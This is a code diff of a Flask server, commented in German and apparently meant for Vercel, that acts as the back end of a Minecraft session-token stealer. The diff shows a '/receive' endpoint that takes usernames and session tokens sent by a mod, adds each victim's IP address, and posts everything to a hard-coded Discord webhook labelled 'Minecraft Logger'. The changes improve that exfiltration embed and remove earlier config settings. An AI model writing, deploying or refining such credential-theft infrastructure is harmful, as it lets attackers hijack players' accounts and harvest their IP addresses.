@@ -1,22 +1,12 @@
 from flask import Flask, request, jsonify
 import requests
 import json
-import os
-import time
-from datetime datetime
+from datetime import datetime
 
+# DIE WICHTIGSTE ZEILE FÜR VERCEL:
 app = Flask(__name__)
 
-# Einfache Config - direkt im Code (für Vercel)
-CONFIG = {
-    "security": {
-        "rate_limit_seconds": 600,
-        "min_token_length": 0,  # Auf 0 setzen für deine Mod
-        "check_duplicate_tokens": False  # Deaktiviert für Vercel
-    }
-}
-
-# Discord Webhook URL - HIER DEINE URL EINTRAGEN!
+# HIER DEINE DISCORD WEBHOOK URL EINTRAGEN:
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493597798292127875/vP2BJERnoRPQ4chSvDY0aY_sE1B4ES-tn1SQJdMiwqT0UPxAXvXbYVZqawSqPWX2hY8g"
 
 def get_client_ip():
@@ -27,12 +17,28 @@ def get_client_ip():
     return request.remote_addr
 
 def send_to_discord(username, token, ip):
+    if not DISCORD_WEBHOOK_URL or "DEINE_ID" in DISCORD_WEBHOOK_URL:
+        print("ERROR: Discord webhook URL not configured!")
+        return False
+    
     try:
+        # Minecraft Kopf Bild
+        head_url = f"https://minotar.net/helm/{username}/100.png"
+        
         embed = {
             "title": "🚨 Neue Minecraft Session",
-            "color": 7414964,
-            "description": f"**Username:** {username}\n**IP:** {ip}\n**Token:**\n```{token[:200]}```",
-            "timestamp": datetime.utcnow().isoformat()
+            "color": 0xff0000,
+            "description": f"**Spieler:** {username}\n**IP:** {ip}",
+            "fields": [
+                {
+                    "name": "🔑 Session Token",
+                    "value": f"```{token[:200]}```",
+                    "inline": False
+                }
+            ],
+            "thumbnail": {"url": head_url},
+            "timestamp": datetime.utcnow().isoformat(),
+            "footer": {"text": "Minecraft Logger"}
         }
         
         payload = {
@@ -42,22 +48,27 @@ def send_to_discord(username, token, ip):
         
         response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
         return response.status_code in [200, 204]
+        
     except Exception as e:
         print(f"Discord error: {e}")
         return False
 
 @app.route('/receive', methods=['POST'])
 def receive():
+    """Haupt-Endpoint für deine Minecraft Mod"""
     data = request.json
     
-    if not data or 'username' not in data or 'token' not in data:
-        return jsonify({"status": "error", "message": "Missing username or token"}), 400
+    if not data:
+        return jsonify({"status": "error", "message": "No JSON data"}), 400
     
-    username = data['username']
-    token = data['token']
+    username = data.get('username')
+    token = data.get('token')
     ip = get_client_ip()
     
-    print(f"Received - User: {username}, IP: {ip}")
+    print(f"📥 Received - User: {username}, IP: {ip}, Token length: {len(token) if token else 0}")
+    
+    if not username or not token:
+        return jsonify({"status": "error", "message": "Missing username or token"}), 400
     
     # An Discord senden
     success = send_to_discord(username, token, ip)
@@ -69,7 +80,8 @@ def receive():
 
 @app.route('/', methods=['GET'])
 def health():
-    return jsonify({"status": "alive"}), 200
+    """Health check für Vercel"""
+    return jsonify({"status": "alive", "endpoint": "/receive"}), 200
 
 @app.route('/auth', methods=['POST'])
 def auth():
